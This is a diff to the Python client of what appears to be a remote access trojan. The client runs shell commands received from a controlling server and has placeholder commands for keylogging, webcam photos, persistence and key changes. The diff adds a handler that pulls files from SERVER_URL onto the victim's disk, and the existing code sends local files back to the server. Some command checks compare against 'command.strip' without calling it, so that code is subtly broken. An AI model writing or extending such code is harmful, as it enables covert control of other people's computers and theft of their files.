@@ -118,7 +118,7 @@ def register_client():
         return None
 
 # Track the current working directory (starting with the root or default directory)
-current_directory = "/"
+current_directory = os.path.expanduser("~")
 
 def execute_command(command):
     """Execute the shell command, update current directory if 'cd' command is issued."""
@@ -170,15 +170,36 @@ while True:
                 )
                 print(response.text)  # Print the API response
                 command = ""
-            if command.strip == "start_keylog":
+            elif command.strip == "start_keylog":
                 pass
-            if command.strip == "stop_keylog":
+            elif command.strip == "stop_keylog":
                 pass
-            if command.strip == "photo":
+            elif command.strip == "photo":
                 pass
-            if command.strip == "upload":
-                pass
-            if command.startswith("download"):
+
+            
+            elif command.startswith('{"command": "UploadFromFiles"'):
+                # if all(key in command_data for key in ["command", "client_id", "filename"]) and command_data["command"] == "UploadFromFiles":
+                command_data = json.loads(command)
+                client_id = command_data["client_id"]
+                filename = command_data["filename"]
+                command=""
+                # Send request to server
+                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&filename={filename}", timeout=5)
+
+                # Check if the response is successful
+                if response.status_code == 200:
+                    file_path = os.path.join(current_directory, filename)
+                    
+                    # Save the file
+                    with open(file_path, "wb") as file:
+                        file.write(response.content)
+                        print("file saved")
+                    print(f"File '{filename}' saved successfully in {current_directory}")
+                else:
+                    print(f"Failed to download file. Server responded with status code {response.status_code}")
+
+            elif command.startswith("download"):
                 _, file_path = command.split(" ", 1)
                 full_file_path = os.path.join(current_directory,file_path)
                 if os.path.exists(full_file_path):
@@ -191,9 +212,9 @@ while True:
                 except Exception as e:
                     print(f"Error sending file: {e}")
                 command = ""
-            if command.strip == "persist":
+            elif command.strip == "persist":
                 pass
-            if command.strip == "change_key":
+            elif command.strip == "change_key":
                 pass
             else:    
                 result = execute_command(command)
